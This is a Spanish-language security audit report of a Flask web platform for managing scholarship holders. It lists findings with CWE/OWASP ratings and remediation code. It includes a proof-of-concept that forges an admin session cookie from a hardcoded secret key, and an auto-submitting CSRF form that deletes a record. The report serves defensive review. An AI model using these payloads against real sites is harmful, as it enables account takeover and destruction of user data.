# Informe de Auditoría de Seguridad — Capa Web (Flask + DDD + SSR)

**Proyecto:** Fonbec — Plataforma de gestión de becarios, tutores, padrinos y administradores
**Alcance:** Capa web (Flask Blueprints) + Application Factory + Auth utilities
**Stack:** Python · Flask · SQLAlchemy · Supabase (Auth + Storage) · Jinja2 (SSR)
**Arquitectura:** Domain-Driven Design (Domain / Application / Infrastructure / Web)
**Metodología:** Análisis estático forense línea por línea + threat modeling + attack chaining
**Scoring:** CWE (MITRE) + OWASP Top 10 2021
**Fecha:** 2026-06-19
**Auditor:** Rol simulado — Desarrollador Senior de Ciberseguridad

---

## Archivos auditados

| # | Archivo | Líneas | Rol |
|---|---------|--------|-----|
| 1 | `src/web/app.py` | 99 | Application Factory — bootstrap Flask, hooks de request, registro de blueprints |
| 2 | `src/web/auth_utils.py` | 35 | Decorador `@requiere_rol` — control de acceso basado en roles |
| 3 | `src/web/routes/auth.py` | 330 | Blueprint `auth_bp` — login, logout, callback, set-password, recuperación, perfil |
| 4 | `src/web/routes/admin.py` | 375 | Blueprint `admin_bp` — CRUD padrinos, vinculaciones, eliminaciones, invitaciones |
| 5 | `src/web/routes/tutor.py` | 110 | Blueprint `tutor_bp` — listado de becarios, detalle, auditoría académica |
| 6 | `src/web/routes/becario.py` | 175 | Blueprint `becario_bp` — dashboard, datos académicos, uploads de documentos |
| 7 | `src/infrastructure/__init__.py` | 9 | Wrapper de mapping SQLAlchemy |

---

## 1. Resumen Ejecutivo

Se realizó una auditoría forense completa sobre la capa web de la plataforma Fonbec. El análisis cubrió **7 archivos** (1.133 líneas de código) con un total de **42 hallazgos** distribuidos entre vulnerabilidades de seguridad, errores de código y desviaciones de la arquitectura DDD declarada.

### Estadísticas agregadas

| Severidad | Vulnerabilidades | Errores de código | Errores DDD | Total |
|-----------|------------------|-------------------|-------------|-------|
| **Crítico** | 4 | 1 | 1 | **6** |
| **Alto** | 9 | 2 | 3 | **14** |
| **Medio** | 10 | 4 | 2 | **16** |
| **Bajo** | 4 | 1 | 1 | **6** |
| **Total** | **27** | **8** | **7** | **42** |

### Top 3 riesgos que requieren acción inmediata

1. **[CRIT-01] `SECRET_KEY` con fallback hardcodeado** (`app.py:35`) — Si la variable de entorno no está seteada en producción, la aplicación firma cookies de sesión con `"dev-secret-key-fonbec-1234"`. Cualquiera con acceso al repositorio puede forjar cookies de sesión y **suplantar a cualquier usuario, incluido el administrador**, sin necesidad de credenciales. Compromiso total del sistema. **CWE-798 · OWASP A07:2021**.

2. **[CRIT-02] Ausencia total de protección CSRF** — Ninguno de los 11 endpoints POST implementados (`/auth/login`, `/auth/set-password`, `/admin/padrinos/nuevo`, `/admin/becarios/<id>/eliminar`, `/admin/becarios/<id>/vinculaciones/vincular`, `/tutor/becario/<id>/auditoria`, etc.) incluye token CSRF ni utiliza `Flask-WTF`. Un atacante puede inducir al admin a visitar una página maliciosa y **eliminar becarios o referentes, vincular actores arbitrarios, o invitar usuarios con cualquier rol**. **CWE-352 · OWASP A01:2021**.

3. **[CRIT-03] Rol y `user_id` confinados a la cookie de sesión firmada** (`app.py:57-65`, `auth.py:53-54`) — La autorización de cada request se basa en `session["rol"]` y `session["user_id"]`, **sin re-validar contra la base de datos ni verificar el `access_token` JWT de Supabase**. Combinado con CRIT-01, permite escalar privilegios forjando la cookie. Adicionalmente, un usuario eliminado o deshabilitado en Supabase mantiene acceso durante toda la vida de la sesión (30 min). **CWE-639 · OWASP A01:2021**.

### Conclusión del auditor

La capa web **no es apta para producción** en su estado actual. El patrón de fallos no es localizado: hay una **falla sistémica de defensa en profundidad** que afecta autenticación, autorización, integridad de estado, manejo de secretos y validación de inputs. Se recomienda **bloquear el deploy** hasta resolver al menos los 6 hallazgos críticos y los 9 altos del roadmap P0/P1.

---

## 2. Metodología y Alcance

### Metodología

El análisis se realizó siguiendo una **combinación de análisis estático manual forense** con las siguientes técnicas:

1. **Lectura línea por línea** de los 7 archivos en busca de patrones de vulnerabilidad conocidos (CWE).
2. **Mapeo CWE → OWASP Top 10 2021** para cada hallazgo, asegurando trazabilidad con frameworks internacionales.
3. **Threat modeling** con attack trees que encadenan múltiples hallazgos en kill chains completas (ver Sección 9).
4. **Análisis de arquitectura DDD** comparando la implementación contra los patrones canónicos de Evans/Vernon: Anti-Corruption Layer, Aggregate Roots, Repository contracts, DTOs, Use Case Requests/Responses.
5. **Attack surface mapping** identificando todos los endpoints expuestos, sus métodos HTTP, autenticación requerida y datos sensibles en flujo.

### Fuera de alcance

- Templates Jinja2 (no proporcionados) — los hallazgos de XSS marcados como "potencial" dependen del uso de `|safe` o `{% autoescape false %}` en los `.html`. **Recomendación**: auditar todos los templates en busca de estos filtros.
- Capa de dominio (`src/domain/`) — no proporcionada. Varios hallazgos DDD son inferidos del uso desde la capa web.
- Capa de aplicación (`src/application/use_cases/`) — no proporcionada. Los hallazgos de validación dependen de si los use cases implementan checks defensivos.
- Capa de infraestructura (`src/infrastructure/`) — no proporcionada. Asumimos que SQLAlchemy parametriza queries (no inyección SQL clásica), pero no verificamos.
- Configuración de despliegue (nginx, gunicorn, Dockerfile, variables de entorno) — no proporcionada.
- Tests — no proporcionados.

### Limitaciones

- **No se ejecutó el código** ni se realizaron pruebas dinámicas (DAST/SAST automatizado).
- **No se auditaron dependencias** (no se proporcionó `requirements.txt` / `Pipfile.lock`). Se recomienda correr `pip-audit` y `safety check`.
- **No se auditó Supabase** (configuración del proyecto, RLS policies, JWT signing key rotation).

---

## 3. Matriz de Riesgo Consolidada

| ID | Título | Sev | CWE | OWASP | Archivo:Línea |
|----|--------|-----|-----|-------|---------------|
| **CRIT-01** | SECRET_KEY con fallback hardcodeado | 🔴 Crítico | CWE-798 | A07 | `app.py:35` |
| **CRIT-02** | Ausencia total de protección CSRF | 🔴 Crítico | CWE-352 | A01 | `auth.py`, `admin.py`, `tutor.py`, `becario.py` (todos los POST) |
| **CRIT-03** | Rol/user_id confinados a cookie firmada, sin re-validación | 🔴 Crítico | CWE-639 | A01 | `app.py:57-65`, `auth.py:53-54` |
| **CRIT-04** | JWT de Supabase nunca re-validado por request | 🔴 Crítico | CWE-613 | A07 | `app.py:50-65` |
| **CRIT-05** | Auto-commit en `teardown_appcontext` (integridad de datos) | 🔴 Crítico | — | — | `app.py:72-78` |
| **CRIT-06** | Filtración de entidad de dominio a la capa web | 🔴 Crítico | — | — | `auth_utils.py:29`, múltiples controllers |
| **HIGH-01** | `SESSION_COOKIE_SECURE` no seteado | 🟠 Alto | CWE-614 | A05 | `app.py:38-39` |
| **HIGH-02** | Session Fixation — no regeneración tras login | 🟠 Alto | CWE-384 | A07 | `auth.py:50-54` |
| **HIGH-03** | Rate limiting ausente en endpoints de auth | 🟠 Alto | CWE-307 | A07 | `auth.py:28, 138, 183` |
| **HIGH-04** | Headers de seguridad ausentes (CSP, HSTS, X-Frame-Options) | 🟠 Alto | CWE-1021, CWE-319 | A05 | `app.py` (no config) |
| **HIGH-05** | Logout vía GET (CSRF logout) | 🟠 Alto | CWE-352 | A01 | `auth.py:76` |
| **HIGH-06** | Upload de archivos sin validación (MIME, tamaño, contenido) | 🟠 Alto | CWE-434 | A04 | `becario.py:120-124` |
| **HIGH-07** | `MAX_CONTENT_LENGTH` ausente (DoS por memoria) | 🟠 Alto | CWE-400 | A04 | `app.py` |
| **HIGH-08** | IDOR en `/tutor/becario/<id_usuario>` | 🟠 Alto | CWE-639 | A01 | `tutor.py:60-78` |
| **HIGH-09** | Stored XSS potencial en campos de perfil y flashes | 🟠 Alto | CWE-79 | A03 | `auth.py:147-154, 294-301`, `admin.py:170, 194, 321, 340` |
| **MED-01** | Tokens Supabase almacenados en sesión Flask | 🟡 Medio | CWE-522 | A04 | `auth.py:51-54` |
| **MED-02** | `access_token` aceptado desde POST form | 🟡 Medio | CWE-601 | A07 | `auth.py:125, 141, 234` |
| **MED-03** | Information disclosure en flashes (`str(e)`) | 🟡 Medio | CWE-209 | A04 | `auth.py:118`, `admin.py:170, 194, 321, 340` |
| **MED-04** | Email enumeration vía `recuperar-contrasena` | 🟡 Medio | CWE-204 | A07 | `auth.py:196-210` |
| **MED-05** | Implicit Flow de OAuth deprecado (fallback) | 🟡 Medio | CWE-326 | A02 | `auth.py:121-122` |
| **MED-06** | Tokens en hidden fields de HTML | 🟡 Medio | CWE-522 | A04 | `auth.py:177, 181, 245, 266, 270` |
| **MED-07** | `directorio_rol` acepta cualquier string en `<rol>` | 🟡 Medio | CWE-20 | A03 | `admin.py:69-83` |
| **MED-08** | `/admin/invitar` no whiteliste el `rol` | 🟡 Medio | CWE-20 | A03 | `admin.py:355-356` |
| **MED-09** | Logout no revoca token si `auth_service.logout` falla | 🟡 Medio | CWE-645 | A07 | `auth.py:82-89` |
| **MED-10** | Mass assignment risk en `datos_usuario` y `ActualizarPerfilRequest` | 🟡 Medio | CWE-915 | A08 | `auth.py:147-154, 308-317` |
| **LOW-01** | `before_request` abre DB session para estáticos | 🟢 Bajo | CWE-400 | A04 | `app.py:50-65` |
| **LOW-02** | `int()` inseguro en `edad` (set-password) | 🟢 Bajo | CWE-20 | A03 | `auth.py:151` |
| **LOW-03** | Comparación case-sensitive de email en eliminaciones | 🟢 Bajo | CWE-178 | A07 | `admin.py:207, 231` |
| **LOW-04** | Sliding expiration ausente | 🟢 Bajo | CWE-613 | A07 | `app.py:37` |

Tabla completa de errores de código y DDD en secciones 7 y 8.

---

## 4. Hallazgos Críticos de Seguridad

### CRIT-01 · `SECRET_KEY` con fallback hardcodeado

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🔴 Crítico |
| **CWE** | CWE-798: Use of Hard-coded Credentials |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **Ubicación** | `src/web/app.py:35` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# app.py:35
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "dev-secret-key-fonbec-1234")
```

**Descripción:**

La `SECRET_KEY` de Flask se obtiene de la variable de entorno `SECRET_KEY`, pero **si esa variable no está definida**, la aplicación silenciosamente cae en un valor hardcodeado `"dev-secret-key-fonbec-1234"`. Este valor:

- Es **público**: vive en el repositorio de código, accesible a cualquier developer, ex-employee, o atacante que obtenga acceso de lectura al repo.
- Es **predecible**: patrón obvio `dev-secret-key-<empresa>-<número>`.
- Es **estable**: no rota entre deploys, ambientes, o reinicios.

Flask usa esta llave para **firmar (HMAC) todas las cookies de sesión**. Si un atacante la conoce, puede **forjar cookies arbitrarias** con cualquier contenido y Flask las aceptará como legítimas.

**Impacto técnico:**

- **Compromiso total de autenticación** (Authentication Bypass).
- **Escalada de privilegios** (Privilege Escalation) — un atacante forja `session["rol"] = "administrador"` y `session["user_id"] = <id del admin>`.
- **Robo de tokens Supabase** almacenados en la sesión (`access_token`, `refresh_token`).
- **Bypass de cualquier control de acceso basado en sesión**.

**Vector de ataque (PoC):**

```python
# PoC: Forjar cookie de admin sin credenciales
# Requisitos: conocer el SECRET_KEY (público en el repo) y el id_usuario del admin
# (que puede obtenerse vía /admin/directorio/administrador si hay un endpoint público,
#  o brute-forceando IDs secuenciales)

from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

# 1. Crear una app Flask con el mismo SECRET_KEY
app = Flask(__name__)
app.secret_key = "dev-secret-key-fonbec-1234"

# 2. Forjar la cookie de sesión
si = SecureCookieSessionInterface()
s = si.get_signing_serializer(app)
forged_cookie = s.dumps({
    "user_id": 1,        # ID del administrador
    "rol": "administrador",
    "access_token": "fake-but-not-validated",  # nunca se re-valida
    "refresh_token": "fake"
})

# 3. Enviar la cookie
import requests
r = requests.get(
    "https://fonbec.example.com/admin/dashboard",
    cookies={"session": forged_cookie}
)
# r.status_code == 200 — acceso concedido sin login
```

**Encadenamiento:**

- **CRIT-01 → CRIT-03**: La cookie firmada contiene `rol` y `user_id` que NO se re-validan contra la DB. Basta con forjar la cookie.
- **CRIT-01 → CRIT-04**: El `access_token` JWT de Supabase también está en la cookie, pero como no se re-valida contra Supabase, el fake token pasa.
- **CRIT-01 → HIGH-08**: Con cookie de tutor forjada, IDOR en `/tutor/becario/<id>` expone datos de cualquier becario.
- **CRIT-01 → CRIT-02**: Con cookie de admin forjada, los CSRF tokens (si existieran) serían irrelevantes — el atacante ya es admin.

**Remediación:**

```python
# app.py — versión segura
import os
import secrets

def create_app() -> Flask:
    app = Flask(__name__, ...)
    
    # 1. Fallar fuerte si no hay SECRET_KEY en producción
    env = os.environ.get("FLASK_ENV", "production")
    secret = os.environ.get("SECRET_KEY")
    
    if not secret:
        if env == "production":
            raise RuntimeError(
                "SECRET_KEY environment variable must be set in production. "
                "Generate one with: python -c 'import secrets; print(secrets.token_urlsafe(64))'"
            )
        # Solo en dev: generar una efímera (no persistente entre reinicios)
        secret = secrets.token_urlsafe(64)
        app.logger.warning("Using ephemeral dev SECRET_KEY — do NOT use in production.")
    
    app.config["SECRET_KEY"] = secret
    
    # 2. Rotación: soportar SECRET_KEY_OLD para rotación sin invalidar sesiones activas
    old_secret = os.environ.get("SECRET_KEY_OLD")
    if old_secret:
        app.config["SECRET_KEY_FALLBACK"] = old_secret  # Flask 2.1+
    
    # ... resto de la configuración
```

**Acciones complementarias:**

1. **Rotar el SECRET_KEY actual inmediatamente** asumiendo que está comprometido (porque está en el repo).
2. **Auditar logs de acceso** buscando sesiones anómalas (cambios de `rol` entre requests, IPs inusuales con sesiones de admin).
3. **Invalidar todas las sesiones activas** forzando re-login global.
4. **Revisar el historial git** para verificar si la llave cambió alguna vez — si nunca cambió, asumir compromiso histórico.

---

### CRIT-02 · Ausencia total de protección CSRF

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🔴 Crítico |
| **CWE** | CWE-352: Cross-Site Request Forgery (CSRF) |
| **OWASP** | A01:2021 — Broken Access Control |
| **Ubicación** | Todos los endpoints POST/PUT/DELETE |
| **Estado** | Confirmado |

**Endpoints afectados (11 rutas POST):**

| Ruta | Archivo:Línea | Operación |
|------|---------------|-----------|
| `POST /auth/login` | `auth.py:28` | Login |
| `POST /auth/logout` | `auth.py:76` | Logout (también GET) |
| `POST /auth/callback` | `auth.py:98` | Recepción de tokens |
| `POST /auth/set-password` | `auth.py:138` | Seteo de contraseña (post-invitación) |
| `POST /auth/recuperar-contrasena` | `auth.py:183` | Solicitud de recuperación |
| `POST /auth/nueva-contrasena` | `auth.py:212` | Reset de contraseña |
| `POST /auth/perfil` | `auth.py:272` | Update de perfil |
| `POST /admin/padrinos/nuevo` | `admin.py:152` | Crear padrino |
| `POST /admin/padrinos/<id>/editar` | `admin.py:175` | Editar padrino |
| `POST /admin/referentes/<rol>/<id>/eliminar` | `admin.py:204` | **Eliminar referente** |
| `POST /admin/becarios/<id>/eliminar` | `admin.py:228` | **Eliminar becario** |
| `POST /admin/becarios/<id>/vinculaciones/vincular` | `admin.py:296` | Vincular actor |
| `POST /admin/becarios/<id>/vinculaciones/desvincular/<tipo>` | `admin.py:325` | Desvincular actor |
| `POST /admin/invitar` | `admin.py:345` | Invitar usuario |
| `POST /tutor/becario/<id>/auditoria` | `tutor.py:84` | Auditar becario |
| `POST /becario/academico/editar` | `becario.py:91` | Update formulario académico |
| `POST /becario/academico/documento/eliminar` | `becario.py:146` | Eliminar documento |

**Descripción:**

No se observa en ningún archivo el uso de `Flask-WTF` (`CSRFProtect`), `flask-seasurf`, ni implementación manual de tokens CSRF (synchronizer token pattern ni double-submit cookie). Tampoco se observa el decorador `@csrf.exempt` que sería indicio de configuración previa.

El único mitigante parcial es `SESSION_COOKIE_SAMESITE = "Lax"`, que bloquea CSRF en requests cross-site POST/PUT/DELETE. **Pero**:

1. `SameSite=Lax` **no bloquea** GET-based CSRF (ver CRIT-05 sobre logout vía GET).
2. `SameSite=Lax` **no bloquea** subdomain-based CSRF (`subdominio.atacante.com` puede eludir si el navegador considera el dominio como same-site).
3. `SameSite=Lax` **depende del navegador** — navegadores antiguos (pre-2019) ignoran el atributo.
4. No es defensa en profundidad — un solo bypass del SameSite compromete todo.

**Impacto técnico:**

Un atacante puede inducir a cualquier usuario autenticado a visitar una página HTML maliciosa que contenga:

```html
<!-- Eliminar becario sin que el admin se entere -->
<form action="https://fonbec.example.com/admin/becarios/42/eliminar" method="POST" id="f">
  <input type="hidden" name="email_confirmacion" value="admin@fonbec.org" />
</form>
<script>document.getElementById('f').submit();</script>
```

El navegador del admin envía la cookie de sesión automáticamente (mismo dominio), y el POST se procesa.

**Vectores de ataque concretos:**

| Vector | Consecuencia |
|--------|--------------|
| CSRF sobre `/admin/becarios/<id>/eliminar` | Eliminación de becarios (datos académicos, vinculaciones, documentos) |
| CSRF sobre `/admin/invitar` | Invitación de usuarios con rol `administrador` a email del atacante → **escalada a admin** |
| CSRF sobre `/admin/padrinos/nuevo` | Creación de padrinos falsos con datos controlados |
| CSRF sobre `/admin/becarios/<id>/vinculaciones/vincular` | Vinculación de un becario con un tutor/padrino controlado por el atacante |
| CSRF sobre `/auth/perfil` | Modificación del perfil del usuario (telefono, dirección) |
| CSRF sobre `/auth/nueva-contrasena` | **Cambio de contraseña** del usuario si el atacante tiene un `access_token` válido (e.g., vía phishing paralelo) |
| Login CSRF sobre `/auth/login` | Loguear a la víctima en la cuenta del atacante (la víctima cree que está en su cuenta y carga datos sensibles) |

**Encadenamiento:**

- **CRIT-02 + CRIT-01**: Si la cookie forjada falla (e.g., SECRET_KEY rotado), CSRF sigue siendo un vector válido contra sesiones legítimas.
- **CRIT-02 + CRIT-05**: Logout vía GET permite CSRF logout → DoS UX.
- **CRIT-02 + HIGH-03**: Sin rate limiting, CSRF puede repetirse infinitamente hasta éxito.

**Remediación:**

```bash
pip install flask-wtf
```

```python
# app.py
from flask_wtf import CSRFProtect

def create_app() -> Flask:
    app = Flask(__name__, ...)
    # ... config existente ...
    
    # CSRF global
    CSRFProtect(app)
    
    # Exentar endpoints legítimos que reciben POST externos (webhooks)
    # Ninguno identificado en este alcance, pero ejemplo:
    # csrf.exempt(stripe_webhook_bp)
```

```html
<!-- En todos los forms de Jinja2 -->
<form method="POST" action="/admin/becarios/{{ id }}/eliminar">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
  <input type="hidden" name="email_confirmacion" value="{{ email }}" />
  <button type="submit">Eliminar</button>
</form>
```

```javascript
// En fetch/AJAX (si hay JS que hace POST)
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
fetch('/admin/invitar', {
  method: 'POST',
  headers: {
    'X-CSRFToken': csrfToken,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ email, rol })
});
```

```html
<!-- En layout base -->
<meta name="csrf-token" content="{{ csrf_token() }}" />
```

**Adicionalmente:**

- Para endpoints de alto impacto (delete, invite, cambiar rol), considerar **re-autenticación** (pedir password de nuevo) o **step-up authentication**.
- Configurar `WTF_CSRF_TIME_LIMIT` (default 1h) apropiadamente.
- Setear `WTF_CSRF_SSL_STRICT = True` en producción para rechazar tokens provenientes de HTTP.

---

### CRIT-03 · Rol y `user_id` confinados a cookie firmada, sin re-validación

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🔴 Crítico |
| **CWE** | CWE-639: Authorization Bypass Through User-Controlled Key |
| **OWASP** | A01:2021 — Broken Access Control |
| **Ubicación** | `src/web/app.py:57-65`, `src/web/auth.py:53-54` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# auth.py:49-54 — login_post
session.permanent = True
session["access_token"] = result["access_token"]
session["refresh_token"] = result["refresh_token"]
session["rol"] = result["rol"]                       # ← guardado en cookie
session["user_id"] = result["usuario"].id_usuario    # ← guardado en cookie

# app.py:55-65 — before_request
g.usuario_actual = None
user_id = session.get("user_id")   # ← leído de cookie
rol = session.get("rol")            # ← leído de cookie

if user_id:
    repo = SQLAlchemyUsuarioRepository(g.db_session)
    if rol:
        g.usuario_actual = repo.obtener_por_id_y_rol(user_id, rol)
    else:
        g.usuario_actual = repo.obtener_por_id(user_id)
```

**Descripción:**

Tras el login exitoso, el `rol` y el `user_id` se guardan en la cookie de sesión Flask (firmada con SECRET_KEY, pero legible y modificable si se conoce la llave). En cada request subsiguiente, `before_request` lee estos valores de la cookie y carga `g.usuario_actual` usando `obtener_por_id_y_rol(user_id, rol)`.

**Problemas identificados:**

1. **El `rol` se confía de la cookie**, no se re-obtiene de la DB. Si un atacante forja la cookie con `rol="administrador"` (vía CRIT-01), la query `obtener_por_id_y_rol(user_id=42, rol="administrador")` — **dependiendo de la implementación del repositorio**:
   - Si hace `WHERE id = ? AND rol = ?`: devolverá None para un usuario que no es admin → `g.usuario_actual = None` → redirect a login. ✅ Defensa parcial.
   - Si hace `WHERE id = ?` y luego filtra en Python: devolverá el usuario sin importar el rol. ❌ Bypass total.
   - **No podemos verificar** porque no se auditaron los repositorios. Asumir lo peor.

2. **El `user_id` se confía de la cookie**. Un atacante con SECRET_KEY puede impersonar a cualquier usuario solo cambiando este valor.

3. **No se re-valida el JWT de Supabase**. El `access_token` almacenado en sesión podría estar expirado, revocado, o inválido, pero la app igualmente carga al usuario desde la DB local. Ver CRIT-04.

4. **Cambios de rol en runtime no se reflejan**. Si un admin deshabilita a un usuario (`estado = "inactivo"`), el usuario mantiene acceso hasta que expire su cookie (30 min).

**Impacto técnico:**

- **Privilege Escalation** (escala de privilegios) — combinado con CRIT-01.
- **Horizontal Privilege Escalation** — impersonación de otro usuario del mismo rol.
- **Stale session** — sesiones de usuarios deshabilitados/degradados siguen activas.

**Vector de ataque:**

Ver PoC en CRIT-01 — basta forjar la cookie con `rol` arbitrario.

**Encadenamiento:**

- **CRIT-03 + CRIT-01**: Compromiso total sin credenciales.
- **CRIT-03 + CRIT-04**: Aún sin forjar cookie, sesencias de usuarios deshabilitados siguen funcionando.
- **CRIT-03 + HIGH-08**: Tutor forjado accede a cualquier becario.

**Remediación:**

```python
# app.py — before_request con re-validación completa
from flask import session, g, redirect, url_for, flash
import jwt  # PyJWT

@app.before_request
def _open_db_session() -> None:
    g.db_session = SessionLocal()
    g.usuario_actual = None
    
    # Saltar DB session para archivos estáticos
    if request.endpoint == 'static':
        return
    
    user_id = session.get("user_id")
    if not user_id:
        return
    
    # 1. Re-validar el JWT de Supabase
    access_token = session.get("access_token")
    if not access_token:
        session.clear()
        return
    
    try:
        # Verificar firma y expiración (requiere JWKS de Supabase)
        # Idealmente, llamar a Supabase auth.getUser(token) para validación server-side
        auth_service = SupabaseAuthService(get_supabase_client())
        supabase_user = auth_service.get_user(access_token)  # lanza si inválido/expirado
    except Exception as e:
        # Token inválido/expirado → forzar re-login
        logging.info(f"Token inválido para user_id={user_id}: {e}")
        session.clear()
        return
    
    # 2. Cargar usuario desde DB (NO desde la cookie)
    repo = SQLAlchemyUsuarioRepository(g.db_session)
    usuario = repo.obtener_por_id(user_id)
    
    if not usuario or not usuario.activo:
        # Usuario eliminado o deshabilitado
        session.clear()
        return
    
    # 3. El rol SIEMPRE se obtiene de la DB, no de la cookie
    g.usuario_actual = usuario
    g.access_token = access_token  # disponible para use cases que lo necesiten
```

```python
# auth_utils.py — usar el rol de la entidad, no de la cookie
def requiere_rol(rol_requerido):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not getattr(g, "usuario_actual", None):
                flash("Debes iniciar sesión.", "error")
                return redirect(url_for("auth.login"))
            
            roles_permitidos = (
                [rol_requerido.lower()] if isinstance(rol_requerido, str)
                else [r.lower() for r in rol_requerido]
            )
            
            # rol leído de la entidad, NO de la cookie
            rol_actual = g.usuario_actual.rol.lower()
            if rol_actual not in roles_permitidos:
                # Log de auditoría para intento de acceso denegado
                logging.warning(
                    f"403: user_id={g.usuario_actual.id_usuario} "
                    f"rol={rol_actual} intentó acceder a ruta que requiere {roles_permitidos}"
                )
                abort(403)
            
            return f(*args, **kwargs)
        return decorated_function
    return decorator
```

---

### CRIT-04 · JWT de Supabase nunca re-validado por request

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🔴 Crítico |
| **CWE** | CWE-613: Insufficient Session Expiration |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **Ubicación** | `src/web/app.py:50-65` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# app.py:50-65
@app.before_request
def _open_db_session() -> None:
    g.db_session = SessionLocal()
    g.usuario_actual = None
    user_id = session.get("user_id")
    rol = session.get("rol")
    
    if user_id:
        repo = SQLAlchemyUsuarioRepository(g.db_session)
        if rol:
            g.usuario_actual = repo.obtener_por_id_y_rol(user_id, rol)
        else:
            g.usuario_actual = repo.obtener_por_id(user_id)
```

**Descripción:**

El `access_token` JWT de Supabase se guarda en la sesión Flask tras el login (`auth.py:51`) y **nunca más se verifica**. En cada request, la app confía solo en `session["user_id"]` para cargar al usuario desde la DB local.

**Consecuencias:**

1. **Sesiones zombies**: Si un usuario es eliminado/bloqueado en Supabase (admin revoca el user), su sesión Flask sigue activa durante 30 min (`PERMANENT_SESSION_LIFETIME`).

2. **Tokens robados no revocables**: Si un atacante roba un `access_token` (vía XSS, MITM, leak de logs), y luego la víctima hace logout, **el token robado sigue siendo válido para Supabase** hasta que expire (default 1h) o hasta que el refresh_token se invalide. Pero como la app **no valida el token contra Supabase**, ni siquiera es necesario tener un token válido — basta con el `user_id` en la cookie.

3. **No hay refresh token rotation**: No se observa lógica que use el `refresh_token` para obtener un nuevo `access_token` cuando este expire. Tras 1h (expiración típica de Supabase), los use cases que llaman a Supabase con el token expirado fallarán con errores 401, pero la sesión Flask seguirá activa.

4. **Revocación remota imposible**: Supabase soporta revocación de sesiones vía admin API. Pero como la app no consulta Supabase en cada request, esa revocación no tiene efecto sobre sesiones Flask activas.

**Impacto técnico:**

- **Insufficient session expiration** tras logout/bloqueo remoto.
- **Token replay** — tokens robados son efectivos mientras dure la sesión Flask.
- **Inconsistencia** entre estado Supabase y estado Flask local.

**Vector de ataque:**

1. Atacante obtiene un `access_token` válido (phishing, XSS, MITM).
2. Víctima detecta actividad sospechosa, cambia contraseña en Supabase (esto rota las sesiones en Supabase).
3. **Pero** el atacante ya tiene la cookie de sesión Flask (robada vía XSS). Como la app no valida el token contra Supabase, **el atacante mantiene acceso** hasta que expire la cookie Flask (30 min) o hasta que el admin regenere el SECRET_KEY.

**Remediación:**

```python
# app.py — re-validación del token en cada request (con caché corto para performance)
import time
from functools import lru_cache

# Caché de validación por 60s para no llamar a Supabase en cada request
@lru_cache(maxsize=10000)
def _validate_supabase_token(token_hash: str, minute: int) -> bool:
    """Cachea el resultado por 1 minuto (minute cambia cada 60s)."""
    auth_service = SupabaseAuthService(get_supabase_client())
    try:
        auth_service.get_user(token_hash)  # implementar wrapper
        return True
    except Exception:
        return False

@app.before_request
def _open_db_session() -> None:
    g.db_session = SessionLocal()
    g.usuario_actual = None
    
    if request.endpoint == 'static':
        return
    
    user_id = session.get("user_id")
    access_token = session.get("access_token")
    
    if not user_id or not access_token:
        return
    
    # Validar token (con caché)
    token_valid = _validate_supabase_token(access_token, int(time.time() // 60))
    if not token_valid:
        session.clear()
        flash("Tu sesión ha expirado.", "error")
        return redirect(url_for("auth.login"))
    
    # Cargar usuario
    repo = SQLAlchemyUsuarioRepository(g.db_session)
    usuario = repo.obtener_por_id(user_id)
    if not usuario or not usuario.activo:
        session.clear()
        return redirect(url_for("auth.login"))
    
    g.usuario_actual = usuario
```

**Nota de performance:** La caché LRU con TTL de 1 minuto reduce las llamadas a Supabase de 1-por-request a 1-por-minuto-por-usuario. Si aún así es prohibitivo, una alternativa es validar solo el `exp` del JWT decodificado (sin validar firma) cada request, y validar firma completa cada 5 min.

---

### CRIT-05 · Auto-commit en `teardown_appcontext` (integridad de datos)

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🔴 Crítico (integridad) |
| **CWE** | — (no es una vulnerabilidad OWASP, pero falla de consistencia) |
| **OWASP** | — |
| **Ubicación** | `src/web/app.py:67-78` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# app.py:67-78
@app.teardown_appcontext
def _close_db_session(exception=None) -> None:
    db_session = g.pop("db_session", None)
    if db_session is not None:
        try:
            if exception is None:
                db_session.commit()      # ← auto-commit en todo request exitoso
            else:
                db_session.rollback()
        finally:
            db_session.close()
```

**Descripción:**

El patrón implementado **auto-commitea al final de cada request exitoso**, sin distinguir si la request modificó datos o no. Esto rompe el patrón Unit of Work de DDD y genera varias inconsistencias:

**Problema 1 — Commits en GET requests:**

Las requests GET (`/admin/directorio/<rol>`, `/admin/becarios/<id>/detalle`, `/tutor/mis-becarios`, etc.) son de solo lectura, pero al final se ejecuta `commit()`. Si el ORM tiene cambios pendientes no intencionales (e.g., lazy-load que triggera update, o accidental modification de una entidad), esos cambios se persisten sin control.

**Problema 2 — Doble commit en admin.py:**

```python
# admin.py:204-225
@admin_bp.route("/referentes/<rol>/<id_referente>/eliminar", methods=["POST"])
def eliminar_referente(rol, id_referente):
    ...
    try:
        uc.execute(...)
        g.db_session.commit()      # ← commit explícito (1)
        flash(f"{rol.capitalize()} eliminado correctamente.", "success")
    except ValueError as e:
        g.db_session.rollback()
        flash(str(e), "error")
    except Exception as e:
        g.db_session.rollback()
        ...
    # Al terminar la función, teardown_appcontext hace commit() OTRA vez (2)
```

El commit explícito seguido del commit del teardown es redundante pero inofensivo en este caso. **Pero** si después del commit explícito y antes del return, una excepción es lanzada (e.g., el `flash` falla, o el `redirect` lanza), el teardown hace `rollback()` — pero los cambios ya fueron persistidos. Estado inconsistente.

**Problema 3 — Commits en flujos parciales de saga:**

```python
# admin.py:228-247 (eliminar_becario)
uc = get_eliminar_becario_uc()
try:
    uc.execute(actor_admin=g.usuario_actual, becario_id=id_becario, ...)
    g.db_session.commit()  # ← saga completa
    flash(...)
except ValueError as e:
    g.db_session.rollback()
    flash(str(e), "error")
